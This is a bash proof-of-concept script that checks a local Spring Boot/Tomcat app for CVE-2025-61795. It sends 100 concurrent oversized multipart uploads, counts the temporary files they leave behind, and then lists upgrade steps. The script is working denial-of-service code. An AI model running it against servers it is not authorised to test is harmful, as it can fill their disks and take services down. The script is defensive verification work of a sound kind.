#!/bin/bash

# CVE-2025-61795 Exploitation Test Script
# This script demonstrates how CVE-2025-61795 can be exploited to cause DoS
# through improper cleanup of temporary files during multipart upload failures.

set -e

# Configuration
APP_URL="http://localhost:8080"
TEMP_DIR="/tmp"
MAX_REQUESTS=100
CONCURRENT_REQUESTS=10
FILE_SIZE=2048  # 2KB file to exceed 1KB limit

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}=== CVE-2025-61795 Exploitation Test ===${NC}"
echo "CVE-2025-61795: Improper Resource Shutdown or Release in Apache Tomcat"
echo "This test demonstrates how temporary files accumulate when multipart uploads fail"
echo ""

# Check if application is running
echo -e "${YELLOW}Checking if application is running at $APP_URL...${NC}"
if ! curl -s "$APP_URL/actuator/health" > /dev/null 2>&1; then
    echo -e "${RED}❌ Application is not running at $APP_URL${NC}"
    echo "Please start the application first:"
    echo "  mvn spring-boot:run"
    exit 1
fi
echo -e "${GREEN}✅ Application is running${NC}"

# Count initial temporary files
echo -e "${YELLOW}Counting initial temporary files...${NC}"
INITIAL_TEMP_FILES=$(find "$TEMP_DIR" -name "tomcat*" -type f 2>/dev/null | wc -l)
echo "Initial Tomcat temp files: $INITIAL_TEMP_FILES"

# Create a large file that will trigger the vulnerability
echo -e "${YELLOW}Creating test file ($FILE_SIZE bytes)...${NC}"
TEST_FILE="/tmp/cve-test-file.txt"
dd if=/dev/zero of="$TEST_FILE" bs=1 count=$FILE_SIZE 2>/dev/null

# Function to send a single request
send_request() {
    local request_id=$1
    local response=$(curl -s -w "%{http_code}" -X POST \
        -F "file=@$TEST_FILE" \
        "$APP_URL/api/v1/files/upload" 2>/dev/null)
    
    local http_code="${response: -3}"
    if [ "$http_code" = "413" ]; then
        echo "Request $request_id: SUCCESS (triggered vulnerability)"
        return 0
    else
        echo "Request $request_id: FAILED (HTTP $http_code)"
        return 1
    fi
}

# Function to run concurrent requests
run_concurrent_requests() {
    local num_requests=$1
    local concurrent=$2
    local success_count=0
    local fail_count=0
    
    echo -e "${YELLOW}Running $num_requests requests with $concurrent concurrent connections...${NC}"
    
    # Use GNU parallel if available, otherwise use background processes
    if command -v parallel > /dev/null 2>&1; then
        echo "Using GNU parallel for concurrent requests..."
        seq 1 $num_requests | parallel -j $concurrent send_request {} | while read line; do
            if [[ $line == *"SUCCESS"* ]]; then
                ((success_count++))
            else
                ((fail_count++))
            fi
        done
    else
        echo "Using background processes for concurrent requests..."
        for i in $(seq 1 $num_requests); do
            # Limit concurrent background processes
            while [ $(jobs -r | wc -l) -ge $concurrent ]; do
                sleep 0.1
            done
            
            (send_request $i) &
        done
        
        # Wait for all background jobs to complete
        wait
    fi
    
    echo "Concurrent requests completed"
}

# Run the exploitation test
echo -e "${YELLOW}Starting CVE-2025-61795 exploitation test...${NC}"
echo "This will send $MAX_REQUESTS requests with $CONCURRENT_REQUESTS concurrent connections"
echo "Each request will upload a $FILE_SIZE byte file to trigger the vulnerability"
echo ""

# Run concurrent requests
run_concurrent_requests $MAX_REQUESTS $CONCURRENT_REQUESTS

# Wait a moment for any async processing
echo -e "${YELLOW}Waiting for async processing to complete...${NC}"
sleep 5

# Count final temporary files
echo -e "${YELLOW}Counting final temporary files...${NC}"
FINAL_TEMP_FILES=$(find "$TEMP_DIR" -name "tomcat*" -type f 2>/dev/null | wc -l)
TEMP_FILES_CREATED=$((FINAL_TEMP_FILES - INITIAL_TEMP_FILES))

echo ""
echo -e "${BLUE}=== Test Results ===${NC}"
echo "Initial temp files: $INITIAL_TEMP_FILES"
echo "Final temp files: $FINAL_TEMP_FILES"
echo "Temp files created: $TEMP_FILES_CREATED"

if [ $TEMP_FILES_CREATED -gt 0 ]; then
    echo -e "${RED}🚨 CVE-2025-61795 CONFIRMED!${NC}"
    echo -e "${RED}   $TEMP_FILES_CREATED temporary files were created and not cleaned up${NC}"
    echo -e "${RED}   This demonstrates the vulnerability that can lead to DoS${NC}"
    
    # Show some of the temp files
    echo ""
    echo -e "${YELLOW}Sample temporary files created:${NC}"
    find "$TEMP_DIR" -name "tomcat*" -type f 2>/dev/null | head -10 | while read file; do
        echo "  $file ($(stat -f%z "$file" 2>/dev/null || echo "unknown") bytes)"
    done
    
    # Calculate total size of temp files
    TOTAL_TEMP_SIZE=$(find "$TEMP_DIR" -name "tomcat*" -type f -exec stat -f%z {} \; 2>/dev/null | awk '{sum+=$1} END {print sum+0}')
    echo ""
    echo -e "${YELLOW}Total size of temporary files: ${TOTAL_TEMP_SIZE} bytes${NC}"
    
else
    echo -e "${GREEN}✅ No temporary files leaked${NC}"
    echo -e "${GREEN}   The vulnerability may be patched or not triggered${NC}"
fi

# Get system information
echo ""
echo -e "${YELLOW}Getting system information...${NC}"
curl -s "$APP_URL/api/v1/files/system-info" | python3 -m json.tool 2>/dev/null || echo "Could not get system info"

# Cleanup
echo ""
echo -e "${YELLOW}Cleaning up test files...${NC}"
rm -f "$TEST_FILE"

# Show cleanup recommendation
if [ $TEMP_FILES_CREATED -gt 0 ]; then
    echo ""
    echo -e "${YELLOW}To clean up temporary files manually:${NC}"
    echo "  find $TEMP_DIR -name 'tomcat*' -type f -delete"
    echo ""
    echo -e "${YELLOW}To fix this vulnerability:${NC}"
    echo "  1. Upgrade to Tomcat 10.1.47+ or 11.0.12+"
    echo "  2. Update Spring Boot to a version that includes the patched Tomcat"
    echo "  3. Monitor temporary file accumulation in production"
fi

echo ""
echo -e "${BLUE}=== Test Complete ===${NC}"
